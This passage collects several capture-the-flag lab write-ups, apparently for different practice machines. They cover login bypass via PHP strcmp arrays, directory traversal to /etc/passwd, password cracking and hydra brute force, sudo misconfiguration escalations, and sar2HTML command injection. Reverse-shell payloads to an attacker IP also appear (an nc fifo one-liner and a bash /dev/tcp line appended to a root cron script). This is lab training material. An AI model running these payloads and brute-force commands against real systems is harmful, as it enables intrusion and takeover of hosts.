Directories/files listed &rarr;

- admin/
- admin/index.php

### Exploitation

Used ftp to login to the service running on port 2112, which allowed anonymous login.

The files available were `index.php.bak` and `welcome.msg`. The backup of the index page consists of the following code &rarr;

```html
<html>
<head></head>
<body>
<?php
$pass= "potato"; //note Change this password regularly
if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! <br> Go to the <a href="dashboard.php">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! <br> Return to the <a href="index.php">login page</a> <p>";
  }
  exit();
}
?>
  <form action="index.php?login=1" method="POST">
    <h1>Login</h1>
    <label><b>User:</b></label>
    <input type="text" name="username" required>
    <br>
    <label><b>Password:</b></label>
    <input type="password" name="password" required>
    <br>
    <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>
```

This gives an idea about how to bypass the login on `/admin/index.php` page. The `strcmp($_POST['password'], $pass) == 0)` check can be bypassed by changing the parameter `password` into `password[]` i.e., change it to an array compared to string. That would evaluate to true. Further, the username from the code shows that the required user is admin. Doing the check as stated by intercepting in Burp and changing parameters, a dashboard page at `/admin/dashboard.php` is made available.

The dashboard page has a Logs section that can retrieve logs from the system. This could have a directory traversal i.e., LFI vulnerability. Catching the request in burp and changing the log file to `../../../../../../../../etc/passwd` gives the required users from the etc passwd file which have the bash login shell &rarr; `root`, `florianges`, `webadmin`.

The entry of interest is webadmin. The hash is available and seems insecure which can be cracked using John the Ripper. For this, the entry `webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash` is stored in a file `test.pass` and John is run as follows &rarr; `john --wordlist=rockyou.txt test.pass`. This revealed the output `dragon` which is the password for the webadmin user.

Used the password `dragon` for the user webadmin for ssh as follows &rarr; `ssh webadmin@192.168.53.101`. This gives the user flag located in the home directory for the user.

### Privilege Escalation

Searched for setuid binaries with command &rarr; `find / -perm -u=s -type f 2>/dev/null`. Without a usable binary, checked allowed executions with sudo as follows &rarr; `sudo -l`. This gives the result that the user is allowed to run all commands under `/bin/nice /notes/*`.

The `/notes/` directory contained scripts for executing `clear` and `id` commands. The `*` here is a wildcard and can thus be used to bypass the strict controls and use directory traversal technique to execute bash in the elevated state.

Therefore, executing the `/bin/nice` command as follows &rarr; `sudo /bin/nice /notes/../bin/bash` gives the root shell, followed by the root flag in the root home directory.

### Exploitation

Mysql can be brute-forced for a password for the user root. Used hydra for this as follows &rarr; `hyda -l root -P rockyou.txt -t 4 mysql://192.168.63.118`. The password was `prettywoman`. With the new password, looking at mysql databases using the following &rarr; `mysql -u root -h 192.168.63.118 -p`.

Looking into the mysql shell, the database is `data` and the table is `fernet`. The table has the following entry &rarr;

cred &rarr; `gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=`

keyy &rarr; `UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=`

The given key and credentials are not any encoding format such as base64, etc. It is in fact fernet. The `cryptography` module in python has support for the fernet encryption. This can be decoded as follows using a python script &rarr;

```python
from cryptography.fernet import Fernet
decryptor = Fernet(b'UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=')
plaintext = decryptor.decrypt(b'gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=')
print(plaintext)
```

Running this as `python3 decrypt.py` gives the output as `b'lucy:wJ9`"Lemdv9[FEw-'`. These can be used as the credentials for ssh running on port 1337. Logging in to ssh with the above credentials gives the user `lucy` with a user flag in the home directory.

### Privilege Escalation

For privilege escalation, searched set uid binaries using the following find command &rarr; `find / -perm -u=s -type f 2>/dev/null`. This does show `sudo`. Listing commands that can be run by user `lucy` by using `sudo -l`, the python2 binary can be called for the file `/opt/exp.py`.

The file contains the following code &rarr;

```python
uinput = raw_input('how are you?')
exec(uinput)
```

`exec()` in python2 basically runs python inside it. Therefore, running the above with `sudo /usr/bin/python2 /opt/exp.py` and giving input as `import os; os.system(“whoami“);` returns `root`.

Therefore, a shell could even be spawned by changing the command, which gives the root flag in the `/root/` directory.

Directories/files listed &rarr;

- index.html
- robots.txt
- phpinfo.php

Robots txt reveals a directory `sar2HTML`, which has an index.php page. The version for the sar2HTML is 3.2.1.

### Exploitation

Google-fu reveals the existence of an RCE exploit for the sar2HTML version 3.2.1. For this exploit, `/sar2HTML/index.php?plot=;whoami` executes the command. The result can be seen on the webpage. Therefore, this was used to enumerate presence of bash, python and netcat. The `/etc/passwd` file was also printed which revealed the 2 users of importance to be `root` and `love`.

Thus, a reverse shell can be spawned using bash payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.147 3002 >/tmp/f` for the user `www-data`.

The user flag was in the `/home/` directory.

### Privilege Escalation

Looking at setuid binaries, the most interesting ones are `arping` and `ping`. Looking at the crontab, there is a process that runs every 5 mins as the root user &rarr; `cd /var/www/html/ && sudo ./finally.sh`. Checking the code of the file, it seems that it runs another file called `write.sh`, which is world writable.

Therefore, using a reverse shell payload to get connection from the machine would execute it as root, thereby, giving a root shell.

This can be done via `echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.49.147/3003 0>&1'" >> write.sh`. This gives a shell in 5 minutes. Subsequently, it also gives the root flag.

The directories `/w/`, `secret` and `keys` contain several interesting files &rarr; 

- ssh private keys within `private` and `private.bak` 
- hostname file with value `seppuku` 
- a wordlist `password.lst` 
- `passwd.bak` and `shadow.bak` 

### Exploitation

The wordlist can be used to brute force the ssh login by using hydra as follows &rarr; 

```bash
hydra -l seppuku -P password.lst ssh://192.168.141.90
```

This gives the valid credentials as `seppuku:eeyoree` which can be used to login to the machine. This also gives the user flag within `local.txt` in the home directory.

Other items such as the backup for the password and shadow files were rabbit holes due to incorrectly formatted hashes.

### Privilege Escalation

#### User

Listing the users in the `/home` directory gives other users as `samurai` and `tanto`. The ssh private keys discovered earlier grant access to user `tanto` via ssh. This leads us to a restricted shell. The `sudo -l` permissions for the user were to only create a symbolic link of the `/root` directory inside `/tmp`. However, this directory would still have the permissions of `root` which means those permissions are still needed to read the root flag.

The user directory also contains a `.passwd` file which contains a password. This password helps login with credentials `samurai:12345685213456!@!@A` for the next user. The `sudo -l` capability for this user is to run the following command &rarr; 

```bash
/../../../../../../home/tanto/.cgi_bin/bin /tmp/*
```

This means that the command tries to execute the file `/home/tanto/.cgi_bin/bin` as a command and the `/tmp/*` as an argument.

#### Root

The command `bin` can be replaced with anything such that it will get executed. This can be done by using a shell script by the same name that can be created on the machine using `nano` as well as served via HTTP from attacker host to the `tanto` machine using `wget`. The file should contain the following &rarr; 

```bash
##!/bin/bash

/bin/bash
```

This can then be made world executable by using `chmod 777 bin` and then moved inside the `.cgi_bin` directory. `samurai` can then use the command with sudo to execute this file which would then grant a root shell and thus the root flag.
